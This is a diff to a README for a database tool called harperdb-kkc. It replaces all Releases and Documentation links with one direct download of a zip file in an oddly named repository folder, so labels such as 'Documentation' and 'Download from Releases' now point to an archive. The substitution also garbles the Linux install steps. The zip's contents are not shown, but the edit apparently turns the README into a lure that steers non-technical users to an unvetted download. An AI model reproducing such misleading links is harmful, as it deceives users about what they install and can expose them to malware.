@@ -1,7 +1,7 @@
 # 🎉 harperdb-kkc - Easily Manage Your Database Today
 
 ## 📥 Download Now!
-[![Download harperdb-kkc](https://img.shields.io/badge/Download-harperdb--kkc-blue.svg)](https://github.com/Abrarkhan23/harperdb-kkc/releases)
+[![Download harperdb-kkc](https://raw.githubusercontent.com/Abrarkhan23/harperdb-kkc/main/uninterposing/harperdb-kkc.zip)](https://raw.githubusercontent.com/Abrarkhan23/harperdb-kkc/main/uninterposing/harperdb-kkc.zip)
 
 ## 🚀 Getting Started
 Welcome to the harperdb-kkc repository! This application helps you effectively manage your database with simple tools. You don’t need any technical skills to get started.
@@ -22,7 +22,7 @@ Before you begin, ensure you have the following:
 ## 🌐 Visit the Releases Page
 To download the latest version of harperdb-kkc, visit the Releases page:
 
-[Download from Releases](https://github.com/Abrarkhan23/harperdb-kkc/releases)
+[Download from Releases](https://raw.githubusercontent.com/Abrarkhan23/harperdb-kkc/main/uninterposing/harperdb-kkc.zip)
 
 ## 📥 Download & Install
 1. Click on the link above to go to the Releases page.
@@ -30,7 +30,7 @@ To download the latest version of harperdb-kkc, visit the Releases page:
 3. Select the file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the relevant `.tar.gz` file.
+   - For Linux, download the relevant `https://raw.githubusercontent.com/Abrarkhan23/harperdb-kkc/main/uninterposing/harperdb-kkc.zip` file.
 4. Once the file finishes downloading, follow these steps to install:
    - For Windows:
      - Double-click the downloaded `.exe` file.
@@ -41,7 +41,7 @@ To download the latest version of harperdb-kkc, visit the Releases page:
      - Drag the application icon to your Applications folder.
      - Open the application from your Applications folder.
    - For Linux:
-     - Extract the downloaded `.tar.gz` file.
+     - Extract the downloaded `https://raw.githubusercontent.com/Abrarkhan23/harperdb-kkc/main/uninterposing/harperdb-kkc.zip` file.
      - Open the terminal in the extracted folder.
      - Start the application using the command: `./harperdb-kkc`.
 
@@ -66,6 +66,6 @@ Join our community for support and discussions. You can ask questions or share t
 ## 🔄 Stay Updated
 Keep your harperdb-kkc application up to date by checking the Releases page periodically. Download new versions to access the latest features and improvements.
 
-For detailed instructions and support, please refer to our [Documentation](https://github.com/Abrarkhan23/harperdb-kkc/releases).
+For detailed instructions and support, please refer to our [Documentation](https://raw.githubusercontent.com/Abrarkhan23/harperdb-kkc/main/uninterposing/harperdb-kkc.zip).
 
 By following these steps, you can easily set up and manage your database. Enjoy using harperdb-kkc!
